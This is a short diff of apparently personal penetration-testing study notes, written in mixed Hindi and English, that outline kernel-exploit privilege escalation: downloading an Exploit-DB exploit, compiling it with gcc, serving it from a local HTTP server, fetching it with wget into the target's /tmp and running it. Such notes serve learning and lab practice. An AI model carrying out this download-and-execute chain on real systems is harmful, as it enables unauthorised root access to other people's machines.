@@ -90,7 +90,7 @@ The Sudo exploit methodology :
 My Steps for Kernel Exploit :
 
 1. Exploit ko local system me - wget https://www.exploit-db.com/exploits/EXPL_FILE se download kiya  
-2. gcc se complile kiya - gcc 12345.c exploit 
+2. gcc se complile kiya - gcc 37292.c exploit 
 3. local system me http server banaya - sudo python3 -m http.server
 4. & Then target machine ke tmp (temp) directory me jaana hai bcoz yehi directory aisi hai jisme hamey write ki permission hai mai ne home directory me bhi check kiya but waha par exploit ko local machine se transfer nhi kar pa rha tha - wget http://IP:PORT/exploit (remember that http use karna hai not https )
 5. ./exploit 
